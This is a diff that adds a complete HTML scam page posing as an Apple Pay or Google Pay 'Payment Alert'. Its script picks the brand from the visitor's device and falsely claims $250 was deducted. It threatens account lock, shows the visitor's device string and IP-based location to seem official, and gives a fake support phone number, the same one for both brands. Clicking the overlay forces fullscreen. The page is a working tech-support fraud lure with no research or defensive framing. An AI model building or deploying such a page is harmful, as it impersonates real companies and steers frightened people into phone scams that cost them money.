@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Payment Security Alert</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f2f2f7;
+    }
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      cursor: pointer;
+    }
+    .popup {
+      background: #fff;
+      padding: 25px 20px;
+      border-radius: 16px;
+      max-width: 340px;
+      text-align: center;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.25);
+    }
+    .popup img {
+      width: 60px;
+      margin-bottom: 10px;
+    }
+    .popup h3 {
+      font-size: 18px;
+      margin: 10px 0;
+      color: #d32f2f;
+    }
+    .popup p {
+      font-size: 15px;
+      margin: 8px 0;
+    }
+    .popup h4 {
+      color: #007aff;
+      margin: 12px 0;
+      font-size: 16px;
+    }
+    .popup a {
+      color: #007aff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay" id="overlay">
+    <div class="popup" id="alertBox">
+      <img id="logo" src="" alt="Logo">
+      <h3 id="title">Payment Alert</h3>
+      <p id="line1"></p>
+      <p id="line2"></p>
+      <p><strong id="line3"></strong></p>
+      <h4 id="phone"></h4>
+      <p id="deviceInfo">📱 Device: Detecting...</p>
+      <p id="locationInfo">📍 Location: Detecting...</p>
+      <p id="timeInfo">🕒 Time: Detecting...</p>
+    </div>
+  </div>
+
+  <script>
+    function isiOS() {
+      return /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    }
+
+    function triggerFullScreen() {
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+      } else if (document.documentElement.webkitRequestFullscreen) {
+        document.documentElement.webkitRequestFullscreen();
+      } else if (document.documentElement.msRequestFullscreen) {
+        document.documentElement.msRequestFullscreen();
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const userAgent = navigator.userAgent;
+      const time = new Date().toLocaleTimeString();
+
+      document.getElementById("deviceInfo").innerText = `📱 Device: ${userAgent}`;
+      document.getElementById("timeInfo").innerText = `🕒 Time: ${time}`;
+
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("locationInfo").innerText =
+            `📍 Location: ${data.city}, ${data.region}, ${data.country_name}`;
+        });
+
+      if (isiOS()) {
+        document.getElementById("logo").src = "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg";
+        document.getElementById("title").innerText = "Apple Pay - Payment Alert";
+        document.getElementById("line1").innerText = "$250.00 has been deducted from your Apple Pay.";
+        document.getElementById("line2").innerText = "If this payment is unauthorized, immediate action is required.";
+        document.getElementById("line3").innerText = "Confirm this transaction or your account will be locked.";
+        document.getElementById("phone").innerHTML =
+          '📞 <a href="tel:+18447092550">Call Apple Support: +1-844-709-2550</a>';
+      } else {
+        document.getElementById("logo").src = "https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg";
+        document.getElementById("title").innerText = "Google Pay - Payment Alert";
+        document.getElementById("line1").innerText = "$250.00 has been deducted from your Google Pay.";
+        document.getElementById("line2").innerText = "If you did not authorize this payment, your account is at risk.";
+        document.getElementById("line3").innerText = "Verify now to avoid Google account suspension.";
+        document.getElementById("phone").innerHTML =
+          '📞 <a href="tel:+18447092550">Call Google Support: +1-844-709-2550</a>';
+      }
+    });
+
+    document.getElementById("overlay").addEventListener("click", function () {
+      triggerFullScreen();
+    });
+  </script>
+</body>
+</html>
